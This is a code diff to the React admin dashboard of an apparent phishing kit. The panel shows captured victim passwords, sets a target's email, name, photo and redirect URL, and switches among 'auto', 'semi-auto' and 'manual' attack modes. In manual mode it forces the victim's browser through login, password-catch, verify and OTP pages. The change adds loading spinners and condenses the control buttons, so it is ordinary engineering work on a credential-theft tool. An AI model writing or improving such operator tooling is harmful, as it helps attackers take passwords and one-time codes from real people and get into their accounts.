@@ -1,6 +1,4 @@
 
-
-      
 "use client";
 
 import { useState, useEffect, useCallback, ChangeEvent } from "react";
@@ -18,7 +16,7 @@ import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
 import { Separator } from "@/components/ui/separator";
 import { Badge } from "@/components/ui/badge";
-import { History, Trash2, UserCircle, Moon, Sun, ShieldQuestion, CheckCircle2, AlertCircle, Mail, KeyRound, Forward, Eye, Clipboard, Type, Lock, Unlock } from "lucide-react";
+import { History, Trash2, UserCircle, Moon, Sun, ShieldQuestion, CheckCircle2, AlertCircle, Mail, KeyRound, Forward, Eye, Clipboard, Type, Lock, Unlock, Loader2 } from "lucide-react";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { useTheme } from "next-themes";
 import {
@@ -47,6 +45,8 @@ const configSchema = z.object({
     attackMode: z.enum(['auto', 'manual', 'semi-auto']),
 });
 
+type ProcessingAction = 'reset' | 'clear' | 'delete' | 'control' | 'lock' | 'mode' | null;
+
 export function AdminDashboard() {
   const [state, setState] = useState<AppState | null>(null);
   const [isUploading, setIsUploading] = useState(false);
@@ -57,6 +57,8 @@ export function AdminDashboard() {
   const [isFormFocused, setIsFormFocused] = useState(false);
   const [activeTab, setActiveTab] = useState("live");
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [isProcessing, setIsProcessing] = useState<ProcessingAction>(null);
+  const [processingId, setProcessingId] = useState<string | null>(null);
 
   const {
     register,
@@ -145,6 +147,8 @@ export function AdminDashboard() {
   };
   
   const handleAttackModeChange = async (mode: 'auto' | 'manual' | 'semi-auto') => {
+    if (isProcessing) return;
+    setIsProcessing('mode');
     setValue('attackMode', mode);
     try {
       const res = await fetch("/api/state", {
@@ -164,6 +168,8 @@ export function AdminDashboard() {
         title: "Error",
         description: "Could not switch attack mode.",
       });
+    } finally {
+      setIsProcessing(null);
     }
   };
 
@@ -208,6 +214,8 @@ export function AdminDashboard() {
   };
   
   const handleToggleLock = async () => {
+    if (isProcessing) return;
+    setIsProcessing('lock');
     try {
       const res = await fetch("/api/state", {
         method: "POST",
@@ -226,11 +234,15 @@ export function AdminDashboard() {
         title: "Error",
         description: "Could not update lock state.",
       });
+    } finally {
+      setIsProcessing(null);
     }
   };
 
   const handleClearVictimData = async () => {
+    if (isProcessing) return;
     if (window.confirm("Are you sure you want to clear all captured victim data? This cannot be undone.")) {
+      setIsProcessing('clear');
       try {
         await fetch("/api/state", {
           method: "POST",
@@ -241,12 +253,17 @@ export function AdminDashboard() {
         fetchState();
       } catch (error) {
         toast({ variant: "destructive", title: "Error", description: "Could not clear victim data." });
+      } finally {
+        setIsProcessing(null);
       }
     }
   };
 
   const handleDeletePassword = async (passwordId: string) => {
+    if (isProcessing) return;
     if (window.confirm("Are you sure you want to delete this password entry?")) {
+      setIsProcessing('delete');
+      setProcessingId(passwordId);
       try {
         const res = await fetch("/api/state", {
           method: "POST",
@@ -261,28 +278,37 @@ export function AdminDashboard() {
         }
       } catch (error) {
         toast({ variant: "destructive", title: "Error", description: "Could not delete password." });
+      } finally {
+        setIsProcessing(null);
+        setProcessingId(null);
       }
     }
   };
 
   const handleResetVictimState = async () => {
-    if (window.confirm("Are you sure you want to restart the attack? This will send the victim back to the start, but will not clear any captured passwords.")) {
+    if (isProcessing) return;
+    if (window.confirm("This will restart the attack flow for the victim but will NOT clear any captured passwords. Continue?")) {
+      setIsProcessing('reset');
       try {
         await fetch("/api/state", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ action: "restartAttack" }),
         });
-        toast({ title: "Attack Restarted", description: "The victim's session has been reset to the beginning." });
+        toast({ title: "Attack Restarted", description: "The victim's session has been reset." });
         fetchState();
       } catch (error) {
         toast({ variant: "destructive", title: "Error", description: "Could not restart the attack." });
+      } finally {
+        setIsProcessing(null);
       }
     }
   };
 
-
   const handleControlClick = async (page: string) => {
+    if (isProcessing) return;
+    setIsProcessing('control');
+    setProcessingId(page);
     try {
       await fetch('/api/state', {
         method: 'POST',
@@ -292,6 +318,9 @@ export function AdminDashboard() {
       toast({ title: 'Command Sent', description: `Forcing victim view to "${page}" page.` });
     } catch (error) {
        toast({ variant: 'destructive', title: 'Error', description: 'Failed to send command.' });
+    } finally {
+      setIsProcessing(null);
+      setProcessingId(null);
     }
   };
 
@@ -348,6 +377,8 @@ export function AdminDashboard() {
   const capturedPasswords = state?.victim.passwords ? 
     Object.entries(state.victim.passwords).map(([id, data]) => ({ id, ...data as any })) 
     : [];
+    
+  const isActionDisbled = !!isProcessing || isConfigLocked;
 
   return (
     <div className="w-full max-w-6xl mx-auto p-2 sm:p-4">
@@ -361,7 +392,7 @@ export function AdminDashboard() {
                 <div className="flex items-center justify-end gap-2">
                     <DropdownMenu>
                       <DropdownMenuTrigger asChild>
-                        <Button variant="outline" size="icon">
+                        <Button variant="outline" size="icon" disabled={!!isProcessing}>
                           <Sun className="h-[1.2rem] w-[1.2rem] rotate-0 scale-100 transition-all dark:-rotate-90 dark:scale-0" />
                           <Moon className="absolute h-[1.2rem] w-[1.2rem] rotate-90 scale-0 transition-all dark:rotate-0 dark:scale-100" />
                           <span className="sr-only">Toggle theme</span>
@@ -379,9 +410,11 @@ export function AdminDashboard() {
                         </DropdownMenuItem>
                       </DropdownMenuContent>
                     </DropdownMenu>
-                    <Button variant="outline" size="icon" onClick={handleResetVictimState} title="Restart Attack"><History className="h-4 w-4" /></Button>
-                    <Button variant="destructive" size="icon" onClick={handleClearVictimData} disabled={activeTab !== 'data'}>
-                        <Trash2 className="h-4 w-4" />
+                    <Button variant="outline" size="icon" onClick={handleResetVictimState} title="Reset Victim Session" disabled={!!isProcessing}>
+                        {isProcessing === 'reset' ? <Loader2 className="h-4 w-4 animate-spin" /> : <History className="h-4 w-4" />}
+                    </Button>
+                    <Button variant="destructive" size="icon" onClick={handleClearVictimData} disabled={activeTab !== 'data' || !!isProcessing}>
+                        {isProcessing === 'clear' ? <Loader2 className="h-4 w-4 animate-spin" /> : <Trash2 className="h-4 w-4" />}
                     </Button>
                 </div>
             </div>
@@ -424,54 +457,17 @@ export function AdminDashboard() {
                           <h3 className="font-semibold text-lg">Manual Controls</h3>
                           <CardDescription className="mb-4">Force the victim's browser to a specific page. This only works when in "Manual" attack mode.</CardDescription>
                           <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-6 gap-2">
+                            {(['login', 'password', 'pwCatch', 'verify', 'otp', 'redirect'] as const).map((page) => (
                               <Button 
-                                variant={state?.victim.currentPage === 'login' ? "default" : "outline"}
-                                onClick={() => handleControlClick('login')}
-                                className={cn("h-12", state?.victim.currentPage === 'login' && "animate-shine")}
-                                disabled={state?.config.attackMode !== 'manual'}
+                                key={page}
+                                variant={state?.victim.currentPage === page ? "default" : "outline"}
+                                onClick={() => handleControlClick(page)}
+                                className={cn("h-12 capitalize", state?.victim.currentPage === page && "animate-shine")}
+                                disabled={state?.config.attackMode !== 'manual' || !!isProcessing}
                               >
-                                Login
+                                {isProcessing === 'control' && processingId === page ? <Loader2 className="h-5 w-5 animate-spin" /> : page.replace('pwCatch', 'Pw-Catch')}
                               </Button>
-                              <Button 
-                                variant={state?.victim.currentPage === 'password' ? "default" : "outline"}
-                                onClick={() => handleControlClick('password')}
-                                className={cn("h-12", state?.victim.currentPage === 'password' && "animate-shine")}
-                                 disabled={state?.config.attackMode !== 'manual'}
-                              >
-                                Password
-                              </Button>
-                              <Button 
-                                variant={state?.victim.currentPage === 'pwCatch' ? "default" : "outline"}
-                                onClick={() => handleControlClick('pwCatch')}
-                                className={cn("h-12", state?.victim.currentPage === 'pwCatch' && "animate-shine")}
-                                 disabled={state?.config.attackMode !== 'manual'}
-                              >
-                                Pw-Catch
-                              </Button>
-                              <Button 
-                                variant={state?.victim.currentPage === 'verify' ? "default" : "outline"}
-                                onClick={() => handleControlClick('verify')}
-                                className={cn("h-12", state?.victim.currentPage === 'verify' && "animate-shine")}
-                                 disabled={state?.config.attackMode !== 'manual'}
-                              >
-                                Verify
-                              </Button>
-                              <Button 
-                                variant={state?.victim.currentPage === 'otp' ? "default" : "outline"}
-                                onClick={() => handleControlClick('otp')}
-                                className={cn("h-12", state?.victim.currentPage === 'otp' && "animate-shine")}
-                                 disabled={state?.config.attackMode !== 'manual'}
-                              >
-                                OTP
-                              </Button>
-                              <Button 
-                                variant={state?.victim.currentPage === 'redirect' ? "default" : "outline"}
-                                onClick={() => handleControlClick('redirect')}
-                                className={cn("h-12", state?.victim.currentPage === 'redirect' && "animate-shine")}
-                                 disabled={state?.config.attackMode !== 'manual'}
-                              >
-                                Redirect
-                              </Button>
+                            ))}
                           </div>
                       </div>
                   </CardContent>
@@ -512,11 +508,11 @@ export function AdminDashboard() {
                                                         {isValid(date) ? format(date, "yyyy-MM-dd HH:mm:ss") : 'Invalid Date'}
                                                     </TableCell>
                                                     <TableCell className="text-right">
-                                                      <Button variant="ghost" size="icon" onClick={() => copyToClipboard(p.value)}>
+                                                      <Button variant="ghost" size="icon" onClick={() => copyToClipboard(p.value)} disabled={!!isProcessing}>
                                                           <Clipboard className="h-4 w-4" />
                                                       </Button>
-                                                      <Button variant="ghost" size="icon" onClick={() => handleDeletePassword(p.id)}>
-                                                          <Trash2 className="h-4 w-4 text-destructive" />
+                                                      <Button variant="ghost" size="icon" onClick={() => handleDeletePassword(p.id)} disabled={!!isProcessing}>
+                                                          {isProcessing === 'delete' && processingId === p.id ? <Loader2 className="h-4 w-4 animate-spin" /> : <Trash2 className="h-4 w-4 text-destructive" />}
                                                       </Button>
                                                     </TableCell>
                                                 </TableRow>
@@ -563,30 +559,30 @@ export function AdminDashboard() {
                                     onValueChange={(value: 'auto' | 'manual' | 'semi-auto') => handleAttackModeChange(value)}
                                     value={field.value}
                                     className="grid grid-cols-1 gap-4"
-                                    disabled={isConfigLocked}
+                                    disabled={isConfigLocked || !!isProcessing}
                                 >
-                                    <Label className={cn("flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer transition-colors hover:bg-accent/50 has-[input:checked]:bg-accent has-[input:checked]:border-primary", isConfigLocked && "cursor-not-allowed opacity-50")}>
+                                    <Label className={cn("flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer transition-colors hover:bg-accent/50 has-[input:checked]:bg-accent has-[input:checked]:border-primary", (isConfigLocked || !!isProcessing) && "cursor-not-allowed opacity-50")}>
                                         <div className="flex items-center justify-between w-full">
                                            <div className="font-semibold">Auto Mode</div>
-                                           <RadioGroupItem value="auto" id="auto" disabled={isConfigLocked}/>
+                                           <RadioGroupItem value="auto" id="auto" disabled={isConfigLocked || !!isProcessing}/>
                                         </div>
                                         <p className="text-sm text-muted-foreground">
                                             A streamlined flow: Email → Password → Redirect. Captures initial credentials then redirects.
                                         </p>
                                     </Label>
-                                    <Label className={cn("flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer transition-colors hover:bg-accent/50 has-[input:checked]:bg-accent has-[input:checked]:border-primary", isConfigLocked && "cursor-not-allowed opacity-50")}>
+                                    <Label className={cn("flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer transition-colors hover:bg-accent/50 has-[input:checked]:bg-accent has-[input:checked]:border-primary", (isConfigLocked || !!isProcessing) && "cursor-not-allowed opacity-50")}>
                                         <div className="flex items-center justify-between w-full">
                                            <div className="font-semibold">Semi-Auto (Fast Catch)</div>
-                                           <RadioGroupItem value="semi-auto" id="semi-auto" disabled={isConfigLocked} />
+                                           <RadioGroupItem value="semi-auto" id="semi-auto" disabled={isConfigLocked || !!isProcessing} />
                                         </div>
                                         <p className="text-sm text-muted-foreground">
                                            A single password capture page that uses the Target Config and then redirects.
                                         </p>
                                     </Label>
-                                    <Label className={cn("flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer transition-colors hover:bg-accent/50 has-[input:checked]:bg-accent has-[input:checked]:border-primary", isConfigLocked && "cursor-not-allowed opacity-50")}>
+                                    <Label className={cn("flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer transition-colors hover:bg-accent/50 has-[input:checked]:bg-accent has-[input:checked]:border-primary", (isConfigLocked || !!isProcessing) && "cursor-not-allowed opacity-50")}>
                                          <div className="flex items-center justify-between w-full">
                                             <div className="font-semibold">Manual Mode</div>
-                                            <RadioGroupItem value="manual" id="manual" disabled={isConfigLocked} />
+                                            <RadioGroupItem value="manual" id="manual" disabled={isConfigLocked || !!isProcessing} />
                                          </div>
                                         <p className="text-sm text-muted-foreground">
                                            A multi-step, interactive flow that you control from the dashboard. Good for complex scenarios.
@@ -603,20 +599,20 @@ export function AdminDashboard() {
                         <CardTitle>Target Configuration</CardTitle>
                         <CardDescription>Set up the target and simulation parameters.</CardDescription>
                     </div>
-                    <Button variant="outline" size="icon" onClick={handleToggleLock}>
-                        {isConfigLocked ? <Lock className="h-4 w-4" /> : <Unlock className="h-4 w-4" />}
+                    <Button variant="outline" size="icon" onClick={handleToggleLock} disabled={!!isProcessing} type="button">
+                        {isProcessing === 'lock' ? <Loader2 className="h-4 w-4 animate-spin" /> : isConfigLocked ? <Lock className="h-4 w-4" /> : <Unlock className="h-4 w-4" />}
                         <span className="sr-only">{isConfigLocked ? 'Unlock' : 'Lock'}</span>
                     </Button>
                   </CardHeader>
                   <CardContent className="space-y-4">
                       <div>
                         <Label htmlFor="targetEmail">Target Email</Label>
-                        <Input id="targetEmail" {...register("targetEmail")} disabled={isConfigLocked} />
+                        <Input id="targetEmail" {...register("targetEmail")} disabled={isActionDisbled} />
                         {errors.targetEmail && <p className="text-sm text-destructive mt-1">{errors.targetEmail.message}</p>}
                       </div>
                       <div>
                         <Label htmlFor="targetName">Target Name</Label>
-                        <Input id="targetName" {...register("targetName")} disabled={isConfigLocked} />
+                        <Input id="targetName" {...register("targetName")} disabled={isActionDisbled} />
                         {errors.targetName && <p className="text-sm text-destructive mt-1">{errors.targetName.message}</p>}
                       </div>
                       <div>
@@ -637,20 +633,20 @@ export function AdminDashboard() {
                             </div>
                           )}
                            <div className="flex-grow">
-                             <Input id="targetProfilePictureFile" type="file" accept="image/*" onChange={handleFileChange} disabled={isConfigLocked || isUploading} />
+                             <Input id="targetProfilePictureFile" type="file" accept="image/*" onChange={handleFileChange} disabled={isActionDisbled || isUploading} />
                            </div>
                         </div>
                         {errors.targetProfilePicture && <p className="text-sm text-destructive mt-1">{errors.targetProfilePicture.message}</p>}
                       </div>
                       <div>
                         <Label htmlFor="redirectUrl">Final Redirect URL</Label>
-                        <Input id="redirectUrl" {...register("redirectUrl")} disabled={isConfigLocked} />
+                        <Input id="redirectUrl" {...register("redirectUrl")} disabled={isActionDisbled} />
                         {errors.redirectUrl && <p className="text-sm text-destructive mt-1">{errors.redirectUrl.message}</p>}
                       </div>
                   </CardContent>
                 </Card>
                  <div className="md:col-span-2">
-                    <Button type="submit" className="w-full h-12" disabled={isUploading || isSubmitting || isConfigLocked}>
+                    <Button type="submit" className="w-full h-12" disabled={isUploading || isSubmitting || isActionDisbled}>
                         {isUploading ? "Uploading..." : isSubmitting ? "Saving..." : "Save Configuration"}
                     </Button>
                  </div>
